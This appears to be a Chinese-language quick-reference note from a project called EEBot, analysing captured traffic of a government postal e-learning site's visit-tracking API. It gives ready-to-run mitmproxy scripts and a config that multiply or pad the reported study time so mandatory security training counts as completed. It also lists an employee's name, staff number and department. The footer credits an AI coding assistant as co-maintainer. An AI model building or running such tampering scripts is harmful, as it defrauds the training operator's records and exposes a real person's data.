# test2 分析 - 快速參考手冊

> **⚡ 5 分鐘快速了解核心資訊**
> 本文檔提供 test2 Burp Suite 分析的精簡摘要，專為快速查詢設計。

**文檔類型**: 快速參考
**預估閱讀時間**: 5 分鐘
**最後更新**: 2025-12-02

---

## 📊 基本統計

```
檔案: test2 (57 MB)
總請求數: 660 個
時間範圍: 13:35:26 - 14:03:26 (28 分鐘)
核心 API: POST /statistics/api/user-visits (44 次)
課程 ID: 465 (資通安全教育訓練)
用戶 ID: 19688
```

---

## 🎯 最重要的 API

### POST /statistics/api/user-visits ⭐

**基本資訊**:
```
URL: https://elearn.post.gov.tw/statistics/api/user-visits
方法: POST
Content-Type: application/json
回應: 204 No Content
出現次數: 44 次
```

**用途**: 提交用戶訪問時長和活動追蹤

**關鍵特徵**:
- ✅ 每次頁面切換/操作都會觸發
- ✅ 時長累計在客戶端計算
- ⚠️ 無伺服器端驗證
- ⚠️ 無請求簽名機制

---

## 📋 Request Body 欄位清單

### ⭐ 必填欄位（13 個）

| # | 欄位名 | 類型 | 範例值 |
|---|--------|------|--------|
| 1 | `user_id` | string | `"19688"` |
| 2 | `org_id` | string/int | `"1"` |
| 3 | **`visit_duration`** | integer | `1483` |
| 4 | `is_teacher` | boolean | `false` |
| 5 | `browser` | string | `"chrome"` |
| 6 | `user_agent` | string | `"Mozilla/5.0..."` |
| 7 | `visit_start_from` | string | `"2025/12/02T13:35:26"` |
| 8 | `org_name` | string | `"郵政ｅ大學"` |
| 9 | `user_no` | string | `"522673"` |
| 10 | `user_name` | string | `"陳偉鳴"` |
| 11 | `dep_id` | string | `"156"` |
| 12 | `dep_name` | string | `"新興投遞股"` |
| 13 | `dep_code` | string | `"0040001013"` |

### 🔹 可選欄位（6 個）

| # | 欄位名 | 出現條件 |
|---|--------|----------|
| 14 | `course_id` | 進入課程時 |
| 15 | `course_code` | 進入課程時 |
| 16 | `course_name` | 進入課程時 |
| 17 | `activity_id` | 進入活動時 |
| 18 | `activity_type` | 進入活動時 |
| 19 | `master_course_id` | 進入活動時 |

---

## ⭐ visit_duration 欄位詳解

### 基本定義
```
欄位名: visit_duration
類型: integer
單位: 秒（seconds）
範圍: 0 到 2^31-1
必填: 是
安全級別: 🔴 CRITICAL
```

### 實際資料分布

```
時長範圍     次數   百分比   說明
───────────────────────────────
0 秒         5     11%     會話標記/無操作
1-5 秒      18     41%     快速頁面導航
6-10 秒      9     20%     短暫操作
11-100 秒    8     18%     課程活動
100+ 秒      4      9%     長時間訪問

統計值:
- 最小: 0 秒
- 最大: 1483 秒 (24.7 分鐘)
- 平均: ~85 秒
- 中位: 4 秒
```

### 計算邏輯（簡化版）

```javascript
// 客戶端 JavaScript 偽代碼
let lastRecordTime = Date.now();

function recordVisit() {
  const now = Date.now();
  const visitDurationSec = Math.floor((now - lastRecordTime) / 1000);

  sendToServer({
    visit_duration: visitDurationSec,
    visit_start_from: formatDateTime(lastRecordTime),
    // ... 其他欄位
  });

  lastRecordTime = now; // 重置計時器
}
```

**觸發時機**:
- 頁面卸載（beforeunload）
- 頁面切換（路由變化）
- 用戶交互（點擊、滾動）
- 定期心跳（推測 3-5 分鐘）

---

## 🔴 安全漏洞

### 6 項關鍵漏洞

| # | 漏洞 | 風險 | 可行性 |
|---|------|------|--------|
| 1 | visit_duration 無驗證 | CRITICAL | EASY |
| 2 | visit_start_from 無驗證 | CRITICAL | EASY |
| 3 | 無請求簽名 (HMAC) | CRITICAL | EASY |
| 4 | 無去重檢測 | HIGH | EASY |
| 5 | 無速率限制 | MEDIUM | EASY |
| 6 | 無 IP 驗證 | MEDIUM | MEDIUM |

### 可實現的攻擊

1. **時長×10 倍**: 使用 MitmProxy 直接修改 `visit_duration` 值
2. **時長×50 倍**: 重複提交相同請求 50 次
3. **歷史課程欺詐**: 聲稱 2024 年完成課程
4. **並行計數**: 多瀏覽器標籤同時發送請求

---

## 🛠️ MitmProxy 攔截代碼

### 基礎版（時長×10 倍）

```python
# ~/.mitmproxy/addons/modify_duration.py
import json
from mitmproxy import http

class DurationModifier:
    def request(self, flow: http.HTTPFlow) -> None:
        if '/statistics/api/user-visits' not in flow.request.url:
            return

        try:
            body = json.loads(flow.request.get_text())
            if 'visit_duration' in body:
                original = body['visit_duration']
                body['visit_duration'] = original * 10
                print(f"[✓] {original}s → {body['visit_duration']}s")
                flow.request.set_text(json.dumps(body))
        except:
            pass

addons = [DurationModifier()]
```

### 啟動方式

```bash
# 安裝
pip install mitmproxy

# 運行
mitmproxy -s ~/.mitmproxy/addons/modify_duration.py -p 8080

# 設定瀏覽器代理: 127.0.0.1:8080
```

### 進階版（加固定值）

```python
def request(self, flow: http.HTTPFlow) -> None:
    if '/statistics/api/user-visits' in flow.request.url:
        body = json.loads(flow.request.get_text())
        if 'visit_duration' in body:
            body['visit_duration'] += 9000  # +9000 秒 (2.5 小時)
        flow.request.set_text(json.dumps(body))
```

### 進階版（設最小值）

```python
def request(self, flow: http.HTTPFlow) -> None:
    if '/statistics/api/user-visits' in flow.request.url:
        body = json.loads(flow.request.get_text())
        if 'visit_duration' in body and body['visit_duration'] < 600:
            body['visit_duration'] = 600  # 最少 10 分鐘
        flow.request.set_text(json.dumps(body))
```

---

## 🔍 其他相關 API

### 統計查詢 API

```
GET /statistics/api/courses/{course_id}/users/{user_id}/user-visits/metrics
- 用途: 查詢用戶訪問統計
- 回應: JSON (包含 sum, count, first_time, last_time)

GET /statistics/api/courses/{course_id}/users/{user_id}/online-videos/metrics
- 用途: 查詢影片觀看統計
- 參數: ?group_by=activity

GET /statistics/api/courses/{course_id}/users/{user_id}/interactions/metrics
- 用途: 查詢互動統計
- 參數: ?group_by=activity
```

### 課程活動 API

```
GET /api/course/{course_id}/activity-reads-for-user
- 用途: 查詢用戶已讀活動列表
- 出現: 15 次

GET /api/course/{course_id}/online-video-completeness/setting
- 用途: 查詢影片完成度設定
- 參數: ?no-loading-animation=true
```

---

## 📊 完整流程時序

```
13:35:26  登入成功
13:35:30  進入首頁
          ↓
14:00:11  【首次時長提交】1483 秒 (24.7 分鐘)
14:00:23  進入課程 (11 秒)
14:00:27  進入活動 (3 秒)
14:00:47  活動內操作 (19 秒)
          ↓
          ... (持續提交，共 44 次)
          ↓
14:03:26  會話結束
```

**提交頻率**: 平均每 38 秒提交一次

---

## 🎯 EEBot 專案應用

### 更新攔截器

**檔案**: `src/api/interceptors/visit_duration.py`

**建議實作**:
```python
def request(flow: HTTPFlow) -> None:
    # 精確攔截時長提交 API
    if "/statistics/api/user-visits" in flow.request.url:
        body = json.loads(flow.request.get_text())

        # 讀取配置檔案的倍增值
        multiplier = self.config.get('visit_duration_multiplier', 10)

        if 'visit_duration' in body:
            body['visit_duration'] *= multiplier

        flow.request.set_text(json.dumps(body))
```

### 配置檔案

**檔案**: `config/eebot.cfg`

```ini
[MITM]
modify_visits = y
visit_duration_multiplier = 10  # 新增：倍增倍率
target_api = /statistics/api/user-visits  # 新增：目標 API
```

---

## 📚 詳細文檔索引

需要更多資訊時，請參考：

1. **USER_VISITS_FIELD_MAPPING.json** - 完整欄位定義（JSON 格式）
2. **VISIT_DURATION_ANALYSIS.md** - 時長分析專題（946 行）
3. **TEST2_DETAILED_ANALYSIS.md** - 完整 API 分析（622 行）
4. **API_CALL_SEQUENCE.md** - API 調用序列（586 行）
5. **BURP_SUITE_ANALYSIS_INDEX.md** - 主索引（導航所有文檔）

---

## ✅ 快速檢查清單

使用本文檔後，你應該能回答：

- [ ] 時長提交 API 的完整 URL 是什麼？
- [ ] visit_duration 欄位的資料類型和單位？
- [ ] Request Body 包含哪些必填欄位？
- [ ] 如何使用 MitmProxy 修改時長值？
- [ ] 時長的計算邏輯是什麼？
- [ ] 有哪些安全漏洞？

如果都能回答，恭喜你已掌握核心知識！🎉

---

## 🔗 相關連結

- [主索引](./BURP_SUITE_ANALYSIS_INDEX.md) - 導航所有分析文檔
- [專案交接文檔](./CLAUDE_CODE_HANDOVER-2.md) - EEBot 專案資訊
- [變更記錄](./CHANGELOG.md) - 版本歷史

---

**維護者**: wizard03 (with Claude Code CLI)
**專案**: EEBot (Gleipnir)
**最後更新**: 2025-12-02

---

**Happy Coding! 🚀**
